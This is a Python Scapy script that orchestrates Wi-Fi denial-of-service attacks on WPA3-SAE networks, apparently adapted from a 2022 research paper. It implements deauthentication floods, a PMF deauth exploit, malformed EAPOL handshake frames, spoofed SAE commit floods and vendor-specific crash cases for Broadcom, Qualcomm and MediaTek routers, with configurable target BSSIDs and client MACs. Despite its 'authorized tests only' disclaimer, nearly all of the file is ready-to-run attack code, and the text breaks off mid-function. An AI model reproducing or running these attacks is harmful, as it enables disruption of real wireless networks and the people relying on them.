#!/usr/bin/env python3
"""
================================================================================
orchestator_master_en.py - CORRECTED SCIENTIFIC EDITION (LIST-BASED + CONTINUOUS)
================================================================================
Based on: "How is your Wi-Fi connection today? DoS attacks on WPA3-SAE"
Journal of Information Security and Applications (2022)
FOR EDUCATIONAL PURPOSES AND AUTHORIZED SECURITY TESTS ONLY!

CORRECTIONS (aligned with paper):
- Case I: single SAE Commit frame, repeated every 30s
- Case II: uses target STA MAC (not random)
- Case III/IV: confirm payload length fixed to 34 bytes total (2 + 32)
- Case VI/Reverse: correct target BSSID & SAE parameters per phase
- Case VII: two‑phase (flood + STA‑spoof)
- PMF: sends a burst of ~60 deauths, 1s wait (SA Query timeout)
- Cookie Guzzler: same MAC per burst
- EAPOL frames correctly set via SNAP(OUI=0x000000, code=0x888E)
================================================================================
"""
import subprocess
import time
import os
import sys
import glob
import random
import yaml
from multiprocessing import Process, Value, Manager, Lock
from scapy.all import (
    RadioTap, Dot11, Dot11Auth, Dot11Deauth, EAPOL,
    sendp, RandMAC, Raw, LLC, SNAP
)

# =====================================================================================
# ======================== CENTRAL CONFIGURATION ======================================
# =====================================================================================
# --- 1. TARGET DATA ---
TARGET_BSSID_5GHZ = "AA:BB:CC:DD:EE:11"      # Replace with actual 5 GHz BSSID
TARGET_BSSID_2_4GHZ = "AA:BB:CC:DD:EE:11"    # Replace with actual 2.4 GHz BSSID

# --- 2. SAE PARAMETERS  ---
SAE_SCALAR_2_4_HEX_LIST = [
        # Paste all 20 scalar hex lines from sae_extractor.py here
]
SAE_FINITE_2_4_HEX_LIST = [
        # Paste all 20 finite hex lines from sae_extractor.py here
]
SAE_SCALAR_5_HEX_LIST = [
        # Paste all 20 scalar hex lines from sae_extractor.py here
]
SAE_FINITE_5_HEX_LIST = [
        # Paste all 20 finite hex lines from sae_extractor.py here
]

# --- 3. SCANNER / MANUAL CHANNELS ---
SCANNER_INTERFACE = ""       #wlan0mon
MANUELLER_KANAL_5GHZ = "104"
MANUELLER_KANAL_2_4GHZ = "6"

# --- 4. TARGET CLIENTS (MANUAL ASSIGNMENT) ---

# Clients for GENERAL attacks (deauth_flood, pmf_deauth_exploit, malformed...)
TARGET_STA_MACS = [
#    "AA:BB:CC:DD:EE:11",         
#    "AA:BB:CC:DD:EE:11",
#    "AA:BB:CC:DD:EE:11"
]

# GROUP A: TARGET IS 5 GHz (The 5 GHz band should crash)
# These attacks require MAC addresses of clients currently on 5 GHz.
# - case6_radio_confusion (Standard)
# - case13_radio_confusion_mediatek_reverse (Reverse)
TARGET_STA_MACS_5GHZ_SPECIAL = [
#    "AA:BB:CC:DD:EE:11",       
#    "AA:BB:CC:DD:EE:11",
#    "AA:BB:CC:DD:EE:11"
]

# GROUP B: TARGET IS 2.4 GHz (The 2.4 GHz band should crash)
# These attacks require MAC addresses of clients currently on 2.4 GHz.
# - case6_radio_confusion_reverse (Reverse)
# - case13_radio_confusion_mediatek (Standard)
TARGET_STA_MACS_2_4GHZ_SPECIAL = [
#    "AA:BB:CC:DD:EE:11",         
#    "AA:BB:CC:DD:EE:11",     
#    "AA:BB:CC:DD:EE:11"
]
# ====================== COMPLETE ENCYCLOPEDIA OF ATTACKS ======================
#
# --- Category: Client Direct Attacks ---
#
# "deauth_flood": Classic deauth attack for forcible disconnection.
# "pmf_deauth_exploit": Exploits the PMF protection mechanism against the client. 
# Phase 1: Preparation (The main attack)
#
#    You start one of your DoS attacks (e.g., back_to_the_future, open_auth, or amplification).
#
#    Goal: The CPU and/or memory of the router are so heavily loaded that it reacts very slowly or not at all to new requests. The router is now "weakened".
#
# Phase 2: The Trigger (The Exploit)
#
#    Your pmf_deauth_exploit process sends a single, unprotected deauthentication frame. It spoofs the router's MAC address.
#
# "malformed_msg1_length", "malformed_msg1_flags": Attacks the client driver via the 4-Way Handshake.
#
# --- Category: Generic WPA3-SAE Attacks (from Section 4 of the study) ---
#
# "bad_algo": Sends authentication frames with an invalid algorithm value.
# "bad_seq": Sends SAE frames with an invalid sequence number.
# "bad_status_code": Sends SAE confirm frames with an invalid status code.
# "empty_frame_confirm": Sends empty SAE confirm frames.
#
# --- Category: Vendor Specific Attacks (from Section 6 of the study) ---
#
# "case1_denial_of_internet": Disconnects a client from the internet by deleting its session on the AP. Broadcom.
# "case2_bad_auth_algo_broadcom": Uses invalid algorithm values to disrupt Broadcom APs. Broadcom.
# "case3_bad_status_code": Sends SAE confirm frames with an invalid status code. Broadcom.
# "case4_bad_send_confirm": Manipulates the "Send-Confirm" counter in SAE confirm frames. Broadcom.
# "case5_empty_frame": Sends empty SAE confirm frames. Broadcom.
# "case6_radio_confusion": Confuses dual-band drivers. Purpose: Crashes the 5 GHz band. Broadcom.
# "case6_radio_confusion_reverse": Inverse logic of Case 6. Purpose: Crashes the 2.4 GHz band. Broadcom.
# "case7_back_to_the_future": Overloads WPA2 APs with WPA3 packets. Broadcom.
# "case8_bad_auth_algo_qualcomm": Like Case II, but tailored to Qualcomm chipsets. Qualcomm.
# "case9_bad_sequence_number": Uses invalid sequence numbers in authentication frames. Qualcomm.
# "case10a_bad_auth_body_empty": Sends authentication frames with an empty body. Qualcomm.
# "case10b_bad_auth_body_payload": Sends authentication frames with a faulty payload. Qualcomm.
# "case11_seq_status_fuzz": Performs a fuzzing attack with varying sequence and status codes. Qualcomm.
# "case12_bursty_auth": Sends authentication frames in bursts to force MediaTek APs to reboot. MediaTek.
# "case13_radio_confusion_mediatek": Confuses MediaTek drivers. Purpose: Crashes the 2.4 GHz band.
# "case13_radio_confusion_mediatek_reverse": Inverse logic of Case 13. Purpose: Crashes the 5 GHz band.
#--------------------------------------------------------------------------------------------------------------
# "cookie_guzzler": Exploits the faulty re-transmission behavior of APs.
#     Effect: Sends SAE Commit frames in "bursts" from random MAC addresses to force the AP to
#             send a disproportionately large number of response frames, thereby overloading itself.
#     Suitable for: WPA3.
###############################################################################################################################################
# ==============================================================================
# HOW TO CHOOSE THE RIGHT ATTACK IN ADAPTER_KONFIGURATION (radio_confusion)
# ==============================================================================
#
# GOAL: Crash the 5 GHz Band
# - Use "case6_radio_confusion" on 2.4GHz adapters
# - Use "case13_radio_confusion_mediatek_reverse" on 2.4GHz adapters
# (Needs MACs in TARGET_STA_MACS_5GHZ_SPECIAL) ✅
#
# GOAL: Crash the 2.4 GHz Band
# - Use "case6_radio_confusion_reverse" on 5GHz adapters
# - Use "case13_radio_confusion_mediatek" on 5GHz adapters
# (Needs MACs in TARGET_STA_MACS_2_4GHZ_SPECIAL) ✅
#     Crash 2.4GHz: adapters on 5GHz, attack is reverse
#    "wlan0mon": {"band": "5GHz", "angriff": "case6_radio_confusion_reverse"},
#     Crash 5GHz: adapters on 2.4GHz, attack is standard
#    "wlan2mon": {"band": "2.4GHz", "angriff": "case6_radio_confusion"}
#################################################################################################################################################
# --- 5. ADAPTER & ATTACK CONFIGURATION ---
ADAPTER_KONFIGURATION = {
#   "wlan2mon": {"band": "5GHz", "angriff": "case6_radio_confusion_reverse"},
    "wlan7mon": {"band": "5GHz", "angriff": "case13_radio_confusion_mediatek"},
    "wlan6mon": {"band": "2.4GHz", "angriff": "case1_denial_of_internet"}
}

PACKETS_PER_SECOND_LIMIT = 1000
BURST_SIZE_OPTIMAL = 64
INTER_PACKET_GAP = 0.0001
EXPERIMENT_DURATION = 3600
MAX_RESTARTS = 100

# =====================================================================================
def load_config(path: str = "config.yaml"):
    """Load constants from a YAML config file and override module-level globals."""
    global TARGET_BSSID_5GHZ, TARGET_BSSID_2_4GHZ
    global SAE_SCALAR_2_4_HEX_LIST, SAE_FINITE_2_4_HEX_LIST
    global SAE_SCALAR_5_HEX_LIST, SAE_FINITE_5_HEX_LIST
    global SCANNER_INTERFACE, MANUELLER_KANAL_5GHZ, MANUELLER_KANAL_2_4GHZ
    global TARGET_STA_MACS, TARGET_STA_MACS_5GHZ_SPECIAL, TARGET_STA_MACS_2_4GHZ_SPECIAL
    global ADAPTER_KONFIGURATION
    global PACKETS_PER_SECOND_LIMIT, BURST_SIZE_OPTIMAL, INTER_PACKET_GAP
    global EXPERIMENT_DURATION, MAX_RESTARTS

    if not os.path.isfile(path):
        print(f"[CONFIG] File '{path}' not found — using hardcoded defaults.")
        return

    try:
        with open(path, 'r', encoding='utf-8') as f:
            c = yaml.safe_load(f)
    except yaml.YAMLError as e:
        sys.exit(f"[CONFIG ERROR] Invalid YAML in '{path}': {e}")

    def get(key, default):
        return c[key] if key in c else default

    TARGET_BSSID_5GHZ               = get("target_bssid_5ghz",               TARGET_BSSID_5GHZ)
    TARGET_BSSID_2_4GHZ             = get("target_bssid_2_4ghz",             TARGET_BSSID_2_4GHZ)
    SAE_SCALAR_2_4_HEX_LIST         = get("sae_scalar_2_4_hex_list",         SAE_SCALAR_2_4_HEX_LIST)
    SAE_FINITE_2_4_HEX_LIST         = get("sae_finite_2_4_hex_list",         SAE_FINITE_2_4_HEX_LIST)
    SAE_SCALAR_5_HEX_LIST           = get("sae_scalar_5_hex_list",           SAE_SCALAR_5_HEX_LIST)
    SAE_FINITE_5_HEX_LIST           = get("sae_finite_5_hex_list",           SAE_FINITE_5_HEX_LIST)
    SCANNER_INTERFACE               = get("scanner_interface",               SCANNER_INTERFACE)
    MANUELLER_KANAL_5GHZ            = get("channel_5ghz",                    MANUELLER_KANAL_5GHZ)
    MANUELLER_KANAL_2_4GHZ          = get("channel_2_4ghz",                  MANUELLER_KANAL_2_4GHZ)
    TARGET_STA_MACS                 = get("target_sta_macs",                 TARGET_STA_MACS)
    TARGET_STA_MACS_5GHZ_SPECIAL    = get("target_sta_macs_5ghz_special",    TARGET_STA_MACS_5GHZ_SPECIAL)
    TARGET_STA_MACS_2_4GHZ_SPECIAL  = get("target_sta_macs_2_4ghz_special",  TARGET_STA_MACS_2_4GHZ_SPECIAL)
    ADAPTER_KONFIGURATION           = get("adapter_konfiguration",           ADAPTER_KONFIGURATION)
    PACKETS_PER_SECOND_LIMIT        = get("packets_per_second_limit",        PACKETS_PER_SECOND_LIMIT)
    BURST_SIZE_OPTIMAL              = get("burst_size_optimal",              BURST_SIZE_OPTIMAL)
    INTER_PACKET_GAP                = get("inter_packet_gap",                INTER_PACKET_GAP)
    EXPERIMENT_DURATION             = get("experiment_duration",             EXPERIMENT_DURATION)
    MAX_RESTARTS                    = get("max_restarts",                    MAX_RESTARTS)

    print(f"[CONFIG] Loaded from '{path}'")

# =====================================================================================
def parse_airodump_csv(csv_file):
    results = {}
    try:
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        ap_block = content.split('\n\n')[0]
        lines = ap_block.strip().split('\n')
        for line in lines:
            if 'BSSID' in line or line.startswith('#') or not line.strip():
                continue
            parts =[p.strip() for p in line.split(',')]
            if len(parts) >= 14:
                bssid = parts[0].upper()
                channel = parts[3].strip()
                if not channel.isdigit(): continue
                channel_int = int(channel)
                if bssid == TARGET_BSSID_2_4GHZ.upper() and 1 <= channel_int <= 14:
                    results['2.4GHz'] = channel
                elif bssid == TARGET_BSSID_5GHZ.upper() and 36 <= channel_int <= 165:
                    results['5GHz'] = channel
    except Exception:
        pass
    return results

def scanner_process(scanner_iface, interval, scan_duration, shared_dict, lock):
    if not scanner_iface: return
    print(f"[SCANNER] Starting on {scanner_iface} (Interval: {interval}s, Scan: {scan_duration}s)")
    for f in glob.glob("/tmp/scan_*"):
        try: os.remove(f)
        except: pass
    while True:
        try:
            timestamp = int(time.time())
            prefix = f"/tmp/scan_{timestamp}"
            cmd =['airodump-ng', '--write', prefix, '--output-format', 'csv',
                   '--band', 'abg', '--write-interval', '2', scanner_iface]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(scan_duration)
            if proc.poll() is None:
                proc.terminate(); proc.wait(timeout=2)
            csv_files = glob.glob(f"{prefix}-*.csv")
            if csv_files:
                latest_csv = max(csv_files, key=os.path.getctime)
                found = parse_airodump_csv(latest_csv)
                with lock:
                    for band in['2.4GHz', '5GHz']:
                        if found.get(band):
                            old, new = shared_dict.get(band), found[band]
                            if old != new:
                                shared_dict[band] = new
                                print(f"\n[!!! SCANNER] {band}: Channel changed {old} -> {new}")
            for f in glob.glob(f"{prefix}*"):
                try: os.remove(f)
                except: pass
            time.sleep(max(0, interval - scan_duration))
        except KeyboardInterrupt: break
        except Exception:
            time.sleep(5)

def set_channel_scientific(interface: str, channel: str) -> bool:
    for cmd in [['iw', 'dev', interface, 'set', 'channel', str(channel)],['iwconfig', interface, 'channel', str(channel)]]:
        try:
            if subprocess.run(cmd, capture_output=True, timeout=2).returncode == 0:
                time.sleep(0.1)
                return True
        except: pass
    return False

def send_burst_scientific(packet_list: list, interface: str, counter: Value):
    if not packet_list: return
    start = time.time()
    sent = 0
    batch_size = min(len(packet_list), BURST_SIZE_OPTIMAL)
    try:
        for i in range(0, len(packet_list), batch_size):
            batch = packet_list[i:i+batch_size]
            sendp(batch, iface=interface, verbose=False, inter=INTER_PACKET_GAP, count=1)
            sent += len(batch)
            elapsed = time.time() - start
            if elapsed < sent / PACKETS_PER_SECOND_LIMIT:
                time.sleep(sent/PACKETS_PER_SECOND_LIMIT - elapsed)
            with counter.get_lock():
                counter.value += len(batch)
    except OSError:
        time.sleep(0.1)

def create_sae_payload_bytes(scalar: bytes, finite: bytes) -> bytes:
    return b'\x13\x00' + scalar[:32] + finite[:64]

def get_random_sae_bytes(scalar_list, finite_list):
    valid_pairs =[
        (s, f) for s, f in zip(scalar_list, finite_list)
        if "INSERT" not in s and len(s) == 64 
        and "INSERT" not in f and len(f) == 128
    ]
    if not valid_pairs: return None, None
    s_hex, f_hex = random.choice(valid_pairs)
    return bytes.fromhex(s_hex), bytes.fromhex(f_hex)

def cleanup(procs):
    for p in procs.values():
        if p and p.is_alive():
            p.terminate(); p.join(timeout=1)
            if p.is_alive(): p.kill()

MAC_POOL =[str(RandMAC()) for _ in range(5000)]
def get_fast_randmac():
    return random.choice(MAC_POOL)

# =====================================================================================
# ======================== VENDOR SPECIFIC ATTACKS ====================================
# =====================================================================================

def run_case1_process(iface, cnt, **kw):
    b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
    if not cls: return
    s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
    if not s: return
    payload = Raw(create_sae_payload_bytes(s, f))
    print(f"[CASE1] {iface}: Denial of Internet (single frame, every 30s)...")
    if not set_channel_scientific(iface, ch): return
    try:
        while True:
            for c in cls:
                frame = RadioTap()/Dot11(addr1=b, addr2=c, addr3=b)/Dot11Auth(algo=3, seqnum=1, status=0)/payload
                sendp(frame, iface=iface, verbose=False)
                with cnt.get_lock():
                    cnt.value += 1
            time.sleep(30)
    except KeyboardInterrupt: pass

def run_case2_process(iface, cnt, **kw):
    b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
    if not cls: return
    print(f"[CASE2] {iface}: Bad Algo Broadcom (with STA MACs)...")
    if not set_channel_scientific(iface, ch): return
    try:
        while True:
            burst =[]
            for c in cls:
                burst.append(RadioTap()/Dot11(addr1=b, addr2=c, addr3=b)/Dot11Auth(algo=5, seqnum=1, status=0))
            send_burst_scientific(burst * (128 // len(burst) + 1), iface, cnt)
            time.sleep(0.1)
    except KeyboardInterrupt: pass

def run_case3_process(iface, cnt, **kw):
    b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
    if not cls: return
    print(f"[CASE3] {iface}: Bad Status Code...")
    if not set_channel_scientific(iface, ch): return
    try:
        while True:
            PAYLOAD = Raw(b'\x00\x00' + os.urandom(32))   # EXACTLY 34 bytes total (2 + 32)
            send_burst_scientific([RadioTap()/Dot11(addr1=b, addr2=c, addr3=b)/Dot11Auth(algo=3, seqnum=2, status=77)/PAYLOAD for c in cls]*64, iface, cnt)
    except KeyboardInterrupt: pass

def run_case4_process(iface, cnt, **kw):
    b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
    if not cls: return
    print(f"[CASE4] {iface}: Bad Send-Confirm...")
    if not set_channel_scientific(iface, ch): return
    try:
        while True:
            PAYLOAD = Raw(b'\x11\x11' + os.urandom(32))   # EXACTLY 34 bytes total (2 + 32)
            send_burst_scientific([RadioTap()/Dot11(addr1=b, addr2=c, addr3=b)/Dot11Auth(algo=3, seqnum=2, status=0)/PAYLOAD for c in cls]*64, iface, cnt)
    except KeyboardInterrupt: pass

def run_case5_process(iface, cnt, **kw):
    b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
    if not cls: return
    print(f"[CASE5] {iface}: Empty Frame...")
    if not set_channel_scientific(iface, ch): return
    try:
        while True:
            send_burst_scientific([RadioTap()/Dot11(addr1=b, addr2=c, addr3=b)/Dot11Auth(algo=3, seqnum=2, status=0) for c in cls]*64, iface, cnt)
    except KeyboardInterrupt: pass

def run_case6_radio_confusion_process(iface, cnt, **kw):
    ch_24, ch_5 = kw['channel_2_4ghz'], kw['channel_5ghz']
    bssid_24, bssid_5 = kw['bssid_2_4ghz'], kw['bssid_5ghz']
    cls = kw.get('clients',[])
    if not (ch_24 and ch_5 and cls): return
    print(f"[CASE6] {iface}: TWO-PHASE Radio Confusion (Crash 5GHz)...")
    try:
        while True:
            # Phase 1: Sender is on 2.4GHz. Target is 2.4GHz BSSID. Must use 2.4GHz parameters!
            if set_channel_scientific(iface, ch_24):
                for _ in range(300):
                    s, f = get_random_sae_bytes(SAE_SCALAR_2_4_HEX_LIST, SAE_FINITE_2_4_HEX_LIST)
                    if not s: continue
                    payload = Raw(create_sae_payload_bytes(s, f))
                    burst =[RadioTap()/Dot11(addr1=bssid_24, addr2=c, addr3=bssid_24)/Dot11Auth(algo=3, seqnum=1, status=0)/payload for c in cls]
                    if burst: send_burst_scientific(burst*(128//len(burst)+1), iface, cnt)
                    time.sleep(0.1)
            # Phase 2: Sender is on 5GHz. Target is 5GHz BSSID. Must use 5GHz parameters!
            if set_channel_scientific(iface, ch_5):
                for _ in range(200):
                    s, f = get_random_sae_bytes(SAE_SCALAR_5_HEX_LIST, SAE_FINITE_5_HEX_LIST)
                    if not s: continue
                    payload = Raw(create_sae_payload_bytes(s, f))
                    burst =[RadioTap()/Dot11(addr1=bssid_5, addr2=c, addr3=bssid_5)/Dot11Auth(algo=3, seqnum=1, status=0)/payload for c in cls]
                    if burst: send_burst_scientific(burst*(128//len(burst)+1), iface, cnt)
                    time.sleep(0.1)
    except KeyboardInterrupt: pass

def run_case6_reverse_process(iface, cnt, **kw):
    ch_24, ch_5 = kw['channel_2_4ghz'], kw['channel_5ghz']
    bssid_24, bssid_5 = kw['bssid_2_4ghz'], kw['bssid_5ghz']
    cls = kw.get('clients',[])
    if not (ch_24 and ch_5 and cls): return
    print(f"[CASE6-REV] {iface}: TWO-PHASE Reverse + PMF (Crash 2.4GHz)...")
    try:
        while True:
            # Phase 1: Sender is on 5GHz. Target is 5GHz BSSID. Must use 5GHz parameters!
            if set_channel_scientific(iface, ch_5):
                for _ in range(300):
                    s, f = get_random_sae_bytes(SAE_SCALAR_5_HEX_LIST, SAE_FINITE_5_HEX_LIST)
                    if not s: continue
                    payload = Raw(create_sae_payload_bytes(s, f))
                    burst =[RadioTap()/Dot11(addr1=bssid_5, addr2=c, addr3=bssid_5)/Dot11Auth(algo=3, seqnum=1, status=0)/payload for c in cls]
                    if burst: send_burst_scientific(burst*(128//len(burst)+1), iface, cnt)
                    time.sleep(0.1)
            # Phase 2: Sender is on 2.4GHz. Target is 2.4GHz BSSID. Must use 2.4GHz parameters!
            if set_channel_scientific(iface, ch_24):
                p2_start = time.time()
                for _ in range(200):
                    s, f = get_random_sae_bytes(SAE_SCALAR_2_4_HEX_LIST, SAE_FINITE_2_4_HEX_LIST)
                    if not s: continue
                    payload = Raw(create_sae_payload_bytes(s, f))
                    burst =[RadioTap()/Dot11(addr1=bssid_24, addr2=c, addr3=bssid_24)/Dot11Auth(algo=3, seqnum=1, status=0)/payload for c in cls]
                    if burst: send_burst_scientific(burst*(128//len(burst)+1), iface, cnt)
                    time.sleep(0.1)
                    if time.time()-p2_start > 40: break
            time.sleep(10)
            for rnd in range(2):
                deauth =[RadioTap()/Dot11(addr1=c, addr2=bssid_24, addr3=bssid_24)/Dot11Deauth(reason=3) for c in cls]
                send_burst_scientific(deauth*60, iface, cnt)
                time.sleep(1.0)
    except KeyboardInterrupt: pass

def run_case7_process(iface, cnt, **kw):
    b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
    if not cls: return
    if not set_channel_scientific(iface, ch): return
    print(f"[CASE7] {iface}: Back to the Future (2‑phase)...")
    phase1_bursts = 600
    try:
        burst_count = 0
        while True:
            if burst_count < phase1_bursts:
                s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
                if s:
                    payload = Raw(create_sae_payload_bytes(s, f))
                    burst =[RadioTap()/Dot11(addr1=b, addr2=get_fast_randmac(), addr3=b)/Dot11Auth(algo=3, seqnum=1, status=0)/payload for _ in range(128)]
                    send_burst_scientific(burst, iface, cnt)
                burst_count += 1
            else:
                for c in cls:
                    s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
                    if s:
                        payload = Raw(create_sae_payload_bytes(s, f))
                        frame = RadioTap()/Dot11(addr1=b, addr2=c, addr3=b)/Dot11Auth(algo=3, seqnum=1, status=0)/payload
                        sendp(frame, iface=iface, verbose=False)
                        with cnt.get_lock():
                            cnt.value += 1
                        time.sleep(0.05)
                burst_count = 0
    except KeyboardInterrupt: pass

def run_case8_process(iface, cnt, **kw):
    b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
    if not cls: return
    if not set_channel_scientific(iface, ch): return
    print(f"[CASE8] {iface}: Bad Auth Algo Qualcomm...")
    try:
        while True:
            send_burst_scientific([RadioTap()/Dot11(addr1=b, addr2=c, addr3=b)/Dot11Auth(algo=random.choice([0]+list(range(7,100))), seqnum=1, status=0) for c in cls]*20, iface, cnt)
    except KeyboardInterrupt: pass

def run_case9_process(iface, cnt, **kw):
    b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
    if not cls: return
    if not set_channel_scientific(iface, ch): return
    print(f"[CASE9] {iface}: Bad Sequence Number...")
    try:
        while True:
            s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
            if not s: continue
            payload = Raw(create_sae_payload_bytes(s, f))
            burst =[RadioTap()/Dot11(addr1=b, addr2=c, addr3=b)/Dot11Auth(algo=random.choice([0,3]), seqnum=3, status=0)/payload for c in cls]
            send_burst_scientific(burst*20, iface, cnt)
    except KeyboardInterrupt: pass

def run_case10a_process(iface, cnt, **kw):
    b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
    if not cls: return
    if not set_channel_scientific(iface, ch): return
    print(f"[CASE10A] {iface}: Bad Auth Body Empty...")
    try:
        while True:
            send_burst_scientific([RadioTap()/Dot11(addr1=b, addr2=c, addr3=b)/Dot11Auth(algo=random.randint(1,65535)) for c in cls]*50, iface, cnt)
    except KeyboardInterrupt: pass

def run_case10b_process(iface, cnt, **kw):
    b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
    if not cls: return
    BAD = Raw(bytes.fromhex('1300b8263a4b72b42638691b47d442785f92ab519b3eff598563c3a3e1914446990b05afd3996a922b6ede4f5f063ecbbe83ee10e9778f8d118b6eed76b97b8d29d7d4d2275704c1a2ff018234deef54e6806ee083b04c27028dcebf71df73e79296'))
    if not set_channel_scientific(iface, ch): return
    print(f"[CASE10B] {iface}: Bad Auth Body Payload...")
    try:
        while True:
            send_burst_scientific([RadioTap()/Dot11(addr1=b, addr2=c, addr3=b)/Dot11Auth(algo=random.randint(1,65535))/BAD for c in cls]*50, iface, cnt)
    except KeyboardInterrupt: pass

def run_case11_process(iface, cnt, **kw):
    b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
    if not cls: return
    c0 = cls[0]
    if not set_channel_scientific(iface, ch): return
    print(f"[CASE11] {iface}: Seq/Status Fuzzing...")
    try:
        while True:
            for seq in range(2):
                st = 0
                burst =[]
                for i in range(1000):
                    if i%100==0: st = (st%11)+1
                    burst.append(RadioTap()/Dot11(addr1=b, addr2=c0, addr3=b)/Dot11Auth(algo=0, seqnum=seq, status=st))
                    if len(burst)>=128: send_burst_scientific(burst, iface, cnt); burst=[]
                if burst: send_burst_scientific(burst, iface, cnt)
            time.sleep(1)
    except KeyboardInterrupt: pass

def run_case12_process(iface, cnt, **kw):
    b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
    if not cls: return
    if not set_channel_scientific(iface, ch): return
    print(f"[CASE12] {iface}: Bursty Auth MediaTek...")
    try:
        while True:
            burst =[]
            for c in cls:
                for a in range(1,5): burst.append(RadioTap()/Dot11(addr1=b, addr2=c, addr3=b)/Dot11Auth(algo=a, seqnum=1, status=0))
            send_burst_scientific(burst*25, iface, cnt)
    except KeyboardInterrupt: pass

def run_case13_process(iface, cnt, **kw):
    ch_send, tgt, cls = kw.get('channel_5ghz'), kw.get('bssid_2_4ghz'), kw.get('clients',[])
    if not (ch_send and tgt and cls): return
    if not set_channel_scientific(iface, ch_send): return
    print(f"[CASE13] {iface}: MediaTek Cross-Band (Crash 2.4GHz)...")
    try:
        while True:
            # Sender is on 5GHz. Must use 5GHz parameters!
            s, f = get_random_sae_bytes(SAE_SCALAR_5_HEX_LIST, SAE_FINITE_5_HEX_LIST)
            if not s: continue
            payload = Raw(create_sae_payload_bytes(s, f))
            burst =[RadioTap()/Dot11(addr1=tgt, addr2=c, addr3=tgt)/Dot11Auth(algo=3, seqnum=1, status=0)/payload for c in cls]
            if burst: send_burst_scientific(burst*64, iface, cnt)
    except KeyboardInterrupt: pass

def run_case13_reverse_process(iface, cnt, **kw):
    ch_send, tgt, cls = kw.get('channel_2_4ghz'), kw.get('bssid_5ghz'), kw.get('clients',[])
    if not (ch_send and tgt and cls): return
    if not set_channel_scientific(iface, ch_send): return
    print(f"[CASE13-REV] {iface}: MediaTek Cross-Band Rev (Crash 5GHz)...")
    try:
        while True:
            # Sender is on 2.4GHz. Must use 2.4GHz parameters!
            s, f = get_random_sae_bytes(SAE_SCALAR_2_4_HEX_LIST, SAE_FINITE_2_4_HEX_LIST)
            if not s: continue
            payload = Raw(create_sae_payload_bytes(s, f))
            burst =[RadioTap()/Dot11(addr1=tgt, addr2=c, addr3=tgt)/Dot11Auth(algo=3, seqnum=1, status=0)/payload for c in cls]
            if burst: send_burst_scientific(burst*64, iface, cnt)
    except KeyboardInterrupt: pass

# =====================================================================================
# ======================== DIRECT / EAPOL ATTACKS =====================================
# =====================================================================================

def run_deauth_process(iface, cnt, **kw):
    b, ch, cls = kw.get('bssid'), kw.get('channel'), kw.get('clients',[])
    if not cls: return
    if not set_channel_scientific(iface, ch): return
    print(f"[DEAUTH] {iface}: Deauth Flood...")
    try:
        while True:
            burst =[]
            for c in cls:
                burst.extend([RadioTap()/Dot11(addr1=c,addr2=b,addr3=b)/Dot11Deauth(reason=7),
                              RadioTap()/Dot11(addr1=b,addr2=c,addr3=b)/Dot11Deauth(reason=7)])
            send_burst_scientific(burst*32, iface, cnt)
    except KeyboardInterrupt: pass

def run_pmf_process(iface, cnt, **kw):
    b, ch, cls = kw.get('bssid'), kw.get('channel'), kw.get('clients',[])
    if not cls: return
    if not set_channel_scientific(iface, ch): return
    print(f"[PMF] {iface}: PMF Deauth Exploit (burst & wait)...")
    try:
        while True:
            deauth =[]
            for c in cls:
                deauth.append(RadioTap()/Dot11(addr1=c, addr2=b, addr3=b)/Dot11Deauth(reason=3))
            send_burst_scientific(deauth * (60 // len(deauth) + 1), iface, cnt)
            time.sleep(1.5)
    except KeyboardInterrupt: pass

def run_malformed_length_process(iface, cnt, **kw):
    b, ch, cls = kw.get('bssid'), kw.get('channel'), kw.get('clients',[])
    if not cls: return
    payload = Raw(b'\x02\x03\x00\x5f\x02\x00\x8a\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x01' + (b'\x00' * 80))
    if not set_channel_scientific(iface, ch): return
    print(f"[MALFORMED_LENGTH] {iface}: Malformed MSG1 Length...")
    try:
        while True:
            # FIX: SNAP(OUI=0x000000, code=0x888E) sets correct Ethertype for EAPOL
            send_burst_scientific([RadioTap()/Dot11(type=2,subtype=8,addr1=c,addr2=b,addr3=b)/LLC()/SNAP(OUI=0x000000, code=0x888E)/payload for c in cls]*10, iface, cnt)
    except KeyboardInterrupt: pass

def run_malformed_flags_process(iface, cnt, **kw):
    b, ch, cls = kw.get('bssid'), kw.get('channel'), kw.get('clients',[])
    if not cls: return
    if not set_channel_scientific(iface, ch): return
    print(f"[MALFORMED_FLAGS] {iface}: Malformed MSG1 Flags...")

    eapol_header = b'\x01\x03\x00\x5f'
    key_desc = b'\x02' 
    key_info = b'\x03\x8a' # Manipulated flags (e.g. Secure + MIC + Install in msg 1)
    key_len = b'\x00\x10'
    replay_cnt = b'\x00\x00\x00\x00\x00\x00\x00\x01'
    nonce = b'\x01' * 32
    iv = b'\x00' * 16
    rsc = b'\x00' * 8
    mic = b'\x00' * 16
    key_data_len = b'\x00\x00'
    key_data = b'' 

    payload = Raw(eapol_header + key_desc + key_info + key_len + replay_cnt + nonce + iv + rsc + mic + key_data_len + key_data)
    try:
        while True:
            send_burst_scientific([RadioTap()/Dot11(type=2, subtype=8, addr1=c, addr2=b, addr3=b)/LLC()/SNAP(OUI=0x000000, code=0x888E)/payload for c in cls]*10, iface, cnt)
            time.sleep(0.5)
    except KeyboardInterrupt: pass

def run_bad_algo_process(iface, cnt, **kw):
    b, ch = kw.get('bssid'), kw.get('channel')
    if not set_channel_scientific(iface, ch): return
    print(f"[BAD_ALGO] {iface}: Bad Algo Generic...")
    try:
        while True:
